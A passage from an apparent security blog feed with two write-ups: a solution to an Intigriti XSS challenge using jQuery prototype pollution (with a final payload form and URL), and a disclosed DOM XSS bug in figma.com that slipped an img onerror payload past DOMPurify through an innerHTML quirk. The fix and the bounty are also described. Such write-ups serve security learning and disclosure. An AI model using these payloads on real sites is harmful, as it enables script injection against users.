    <span class="nx">at</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">fn</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nf">attr </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">7872</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nx">tset2</span><span class="p">.</span><span class="nx">htm</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">23</span>
</code></pre></div></div>

<p>The statement <code class="language-plaintext highlighter-rouge">"set" in hooks</code> was triggering this error, as set property is there only in case of objects but turns out hooks was containing a string.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="k">if </span><span class="p">(</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span>
				<span class="p">(</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">hooks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="p">)</span> <span class="p">{</span>
				<span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
			<span class="p">}</span>
</code></pre></div></div>

<p>Tracing it back from where hooks came from</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if </span><span class="p">(</span> <span class="nx">nType</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">||</span> <span class="o">!</span><span class="nx">jQuery</span><span class="p">.</span><span class="nf">isXMLDoc</span><span class="p">(</span> <span class="nx">elem</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nx">hooks</span> <span class="o">=</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span> <span class="o">||</span>
                <span class="p">(</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">expr</span><span class="p">.</span><span class="nx">match</span><span class="p">.</span><span class="nx">bool</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">?</span> <span class="nx">boolHook</span> <span class="p">:</span> <span class="kc">undefined</span> <span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>somehow <code class="language-plaintext highlighter-rouge">name</code> contains the polluted property for eg in this case <code class="language-plaintext highlighter-rouge">test</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
</code></pre></div></div>

<p>Normally it would return undefined but due to the prototype pollution</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span>
<span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">.</span><span class="nf">toLowercase</span><span class="p">()</span> <span class="p">]</span> <span class="nx">was</span> <span class="nx">returning</span> <span class="nx">a</span> <span class="nx">string</span> <span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
</code></pre></div></div>

<p>Tracing more backwards to see where name is coming from</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span> <span class="p">{</span>
    <span class="na">attr</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="p">)</span> <span class="p">{</span>
</code></pre></div></div>
<p>name -&gt; test</p>

<p>value -&gt; <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code></p>

<p>Tracing from where this function was called:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span> <span class="nx">fn</span> <span class="p">)</span> <span class="p">{</span>
			<span class="k">for </span><span class="p">(</span> <span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
				<span class="nf">fn</span><span class="p">(</span>
					<span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">raw</span> <span class="p">?</span>
						<span class="nx">value</span> <span class="p">:</span>
						<span class="nx">value</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span> <span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">i</span><span class="p">,</span> <span class="nf">fn</span><span class="p">(</span> <span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">)</span>
				<span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for </span><span class="p">(</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nf">access</span><span class="p">(</span> <span class="nx">elems</span><span class="p">,</span> <span class="nx">fn</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">key</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">emptyGet</span><span class="p">,</span> <span class="nx">raw</span> <span class="p">);</span>
		<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/3bd3aa7a-f77a-4062-96a5-796f64db3b98" alt="image" /></p>

<p>elems contains a reference to the iframe element and key contains the json object which passed in as argument to the attr method</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">});</span>
</code></pre></div></div>

<p>so key was equal to</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
 <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
 <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Thanks to the prototype pollution bug, even though only two attributes were provided (src,hidden)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for </span><span class="p">(</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
		<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/b0479b85-9ef0-45be-90da-27d131b993d1" alt="image" /></p>

<p>See <code class="language-plaintext highlighter-rouge">test</code> came from the <code class="language-plaintext highlighter-rouge">__proto__</code></p>

<p>If I can somehow fix that “set” in error , I would be able to get a very simple xss as</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if </span><span class="p">(</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="c1">// error trigger here</span>
                <span class="p">(</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">hooks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nx">elem</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="o">+</span> <span class="dl">""</span> <span class="p">);</span> <span class="c1">// here is the sink</span>
            <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
</code></pre></div></div>

<p>For other attributes <code class="language-plaintext highlighter-rouge">hooks</code> is undefined so it skips the if statement and directly reaches the sink which sets the attribute to the elem (refrencing to the iframe tag)</p>

<p>By polluting some properties like this, it can give you xss (if you can somehow skip the hooks if condition check)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">srcdoc</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert()</span><span class="dl">"</span>
</code></pre></div></div>

<p>This is where it took me much time to figure out the solution https://gist.github.com/Sudistark/d869e505c8ff45c3bb96612bcb2c953b even tried asking Mizu if I was on the right path or not</p>

<p>He told me yeah it should work as this is the unintended solution which everyone was using :p,as I knew there must be something I am still missing I looked at it again and again to fix it but still had no success.
I was looking for a way to make hooks undefined,which didn’t looked possible as the polluted property will be available to all the objects.</p>

<p>Next day when I again looked at it, I noticed that:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span>
</code></pre></div></div>

<p>They were transforming the polluted property to lowercase before using it, so if for eg pollute a propert <code class="language-plaintext highlighter-rouge">SRCDOC</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">SRCDOC</span><span class="o">=</span><span class="mi">1337</span>

<span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span><span class="dl">"</span><span class="s2">srcdoc</span><span class="dl">"</span><span class="p">]</span> <span class="c1">// undefined as only the SRCDOC exists not srcdoc in the prototype chain</span>
</code></pre></div></div>

<p>Due to the lowercase transformation it was possible to make hooks undefined and reach the sink easily.</p>

<p>https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22<strong>proto</strong>.ONLOAD%22%20value=%22alert()%22/%3E%20%3C/form%3E&amp;search=angular/material-start</p>

<p>Final payload</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span> 
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"angular/material-start"</span><span class="nt">&gt;</span> 
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"__proto__.ONLOAD"</span> <span class="na">value=</span><span class="s">"alert()"</span><span class="nt">/&gt;</span> 
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/287124f6-67ef-47e9-b347-a095a98f2124" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[Mizu put another great xss challenge at the start of this year, so I went all in to solve it this time finally :p]]></summary></entry><entry><title type="html">Interesting case of a DOM XSS in www.figma.com</title><link href="http://localhost:4000/2023/10/20/Interesting-case-of-a-DOM-XSS-in-www.figma.com.html" rel="alternate" type="text/html" title="Interesting case of a DOM XSS in www.figma.com" /><published>2023-10-20T00:00:00+00:00</published><updated>2023-10-20T00:00:00+00:00</updated><id>http://localhost:4000/2023/10/20/Interesting-case-of-a-DOM-XSS-in-www.figma.com</id><content type="html" xml:base="http://localhost:4000/2023/10/20/Interesting-case-of-a-DOM-XSS-in-www.figma.com.html"><![CDATA[<p>Recently I was able to find a DOM based xss in www.figma.com in collaboration with <a href="https://twitter.com/aszx87410">@huli</a> (an awesome ctf player).</p>

<p>The cause of the XSS is really interesting, at first sight if you are not aware of the weird browser quirk everything looks secure as it’s going through a sanitization process using the unfamous sanitizer “DomPurify” , props to huli for identifying this.</p>

<p>Figma is really a tough target I feel, they have really done very well securing their site.So if you are looking for a tough target with a good security team then give a shot to Figma program. I was focusing on their desktop app which is build in Electron hoping I could learn more about Electron hacking stuff along with it.So I thought maybe if I can xss somewhere that could be useful in the Desktop app.</p>

<p>After some time looking here there, I was able to find a place where it allowed the user to make the description text bold,italic this looked interesting.</p>

<p>Users can publish their design to the public , it’s accessible under this url: <code class="language-plaintext highlighter-rouge">https://www.figma.com/community/file/*</code></p>

<p><img src="https://user-images.githubusercontent.com/31372554/276819715-a519019f-626c-44c3-a761-616bc34666dd.png" alt="image" /></p>

<p>In this screenshot you could see that we can some do some styling stuffs such as bold,italic. Upon intercepting the submit request for this:</p>

<p>I noticed raw html tags there.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Published to Community hub"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;&lt;strong&gt;&lt;em&gt;shirley&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>If you try to include <code class="language-plaintext highlighter-rouge">&lt;&gt;</code> directly from the editor (website UI) they will appear as html encoded in the request:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Published to Community hub"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;&lt;strong&gt;&lt;em&gt;shirley&amp;lt;img src=x onerror=alert()&amp;gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>So instead I directly edited the raw request and modified the <code class="language-plaintext highlighter-rouge">description</code> key to include a xss payload:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Published to Community hub"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;&lt;strong&gt;&lt;em&gt;shirley&lt;img src=x onerror=alert()&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The success response  had the full payload as it is there, this indicated that if there was any sanitization it would be happening on the client side only not server side.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276824564-d11e70d0-79cc-469f-9a6b-7a6640fa0b30.png" alt="chrome_0Tq9BqZHXy" /></p>

<p>From <em>Inspect Element</em> I could confirm that the img tag was removed,so surely some sanitization was there.</p>

<hr />

<p>Using DOMInvader , I found where the sanitization is occuring:</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276832784-5e452e93-9d73-4264-9ce3-0338b1946185.png" alt="chrome_0o4gHfz2j8" />
<img src="https://user-images.githubusercontent.com/31372554/276832865-0f1341e2-85d2-49a5-bb66-56ef0cd077a0.png" alt="image" /></p>

<p>https://www.figma.com/esbuild-artifacts/ea8217961882eb1214f870449504b1c89251179b/js/figma_app.min.js:3213:35988</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">IFs</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">y</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">y</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span> <span class="c1">// [2]</span>
          <span class="p">,</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">y</span> <span class="k">of</span> <span class="nx">g</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">h</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">HAm</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span> <span class="c1">// [3]</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">e</code> variable contained the description key value.
On line [1] you could see the user controllable input is assigned to innerHTML property of a newly created div element (<code class="language-plaintext highlighter-rouge">createElement("div")</code>). As it’s not currently added to the dom yet this is fine.</p>

<p>From line [2], the code removes all the tags from the input (description field) which are not in the IFs array (considered it to be an whitelist of allowed tags)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nx">IFs</span>
<span class="p">(</span><span class="mi">20</span><span class="p">)[</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">span</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sub</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sup</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">i</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">pre</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">code</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">em</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strike</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strong</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">h1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">h2</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">h3</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ul</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ol</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hr</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">br</span><span class="dl">'</span><span class="p">]</span>
</code></pre></div></div>

<p>After this modification, it is then sanitized HAm is nothing but dompurify object itself</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HAm</span><span class="p">.</span><span class="nx">version</span>
<span class="dl">'</span><span class="s1">2.3.1</span><span class="dl">'</span>

</code></pre></div></div>
<p>Also if you search for dompurify in the same js file you will find this:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">dompurify</span><span class="o">/</span><span class="nx">dist</span><span class="o">/</span><span class="nx">purify</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span>
  <span class="p">(</span><span class="o">*!</span> <span class="p">@</span><span class="nd">license</span> <span class="nx">DOMPurify</span> <span class="mf">2.3</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<p>The version used here is pretty old, the latest one is 3.0.6.
But there are no known bypasses so it’s fine.</p>

<p>Finding 0day in dompurify isn’t an option here neither I am skilled enough to find one so what else can we do in this situation?</p>

<p>The only possible solution I had in my mind was do something via DOM Clobbering. An example case of dom clobbering in the wild can be found here: https://research.securitum.com/xss-in-amp4email-dom-clobbering/</p>

<p>But still I am not good with that, so instead I tried reaching out to some CTF players. I really respect CTF players when it comes to exploiting such bugs they are the ones you should reach out to as they are aware with many weird quirks which not everyone is aware of.</p>

<hr />

<p>Shared the details with Huli, the next day he tells me that he is able to execute js but CSP is blocking it.</p>

<p>When I saw the payload  I didn’t believed it:</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276841524-00bdcff1-b628-48cc-877a-46fa9673c339.png" alt="image" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I was really baffled how could this simple payload can bypass a sanitizer like DOMPurify. I really had a hard time understanding this at first even after huli tried explaining it many times.</p>

<p>Some snapshot for you to understand also what actually happened:</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276843048-a122d366-8150-4085-9272-3e638a25cb9e.png" alt="image" />
<img src="https://user-images.githubusercontent.com/31372554/276843242-20e09a8c-7fba-4c7b-80cf-4aab57095e1a.png" alt="image" />
<img src="https://user-images.githubusercontent.com/31372554/276843373-c4b65d58-14d3-4c0d-a0ae-bd51b5becee1.png" alt="image" /></p>

<p>https://x.com/ZeddYu_Lu/status/1421091362410156032?s=20</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276843791-aa0bad98-153e-4cbe-a84c-5f21ca0689ec.png" alt="image" /></p>

<hr />

<p>Try it yourself ,open developer tools try this</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span><span class="p">;</span>
</code></pre></div></div>

<p>Even though the div element isn’t added to the DOM it still <strong>executes</strong> . It’s like  a magic really.</p>

<hr />

<p>We really tried escalating this, but the strict csp blocked  our all attempts. We decided to report it as it is without CSP bypass, mature programs often accepts xss bugs even without CSP eg: is GoogleVRP</p>

<p>If you are curios here’s the csp:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script-src 'unsafe-eval' 'nonce-PVEIuETDGJR+8hIA6PqgIQ==' 'strict-dynamic' ; 
</code></pre></div></div>

<p>The reporting experience was very smooth, the Figma sec team is really professional. The bug was fixed (in a week after triage which I consider really great even for bugs like xss) was soon and the team “really liked this cool bug” they said :)</p>

<p>We were awarded 1k$ for this bug and the severity was scored as Medium.
<img src="https://user-images.githubusercontent.com/31372554/276845729-faba7890-2c4c-4d33-a666-d24ccd3c6b2d.png" alt="image" /></p>

<p>I asked them though if severity was set to Medium because we were not able to provide a csp bypass and they gave their explanation which I happily agree with.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276846064-25bb917d-36c2-429c-9c97-a9a9677f783f.png" alt="image" /></p>

<p>Overall it was a great experience submitting a report to Figma, their team is reall great.</p>

<p>Note: If you got more details on that innerHTML quirk would be happy if you could explain in the tweet reply why it really works</p>

<hr />

<p><strong>Fix:</strong></p>

<p>After the fix the code responsible for sanitization was changed to this:</p>

<p>Fixed version</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Hum</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">IFs</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">y</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">y</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
          <span class="p">,</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">y</span> <span class="k">of</span> <span class="nx">g</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">h</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span>
</code></pre></div></div>

<p>Before it was like this (vulnerable version):</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       <span class="kd">let</span> <span class="nx">g</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">g</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">nJe</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">v</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
          <span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">g</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">v</span> <span class="k">of</span> <span class="nx">b</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">y</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">y</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">v</span><span class="p">);</span>
        <span class="nx">n</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">tAr</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">g</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span> <span class="c1">// [2]</span>
</code></pre></div></div>
<p>The root cause of xss bug was because of passing user controllable input to innerHTML at line [1] and later sanitization on line  [2]. Although the div element was not added to the dom it still executed, it’s one of the weird quirks of browsers.</p>

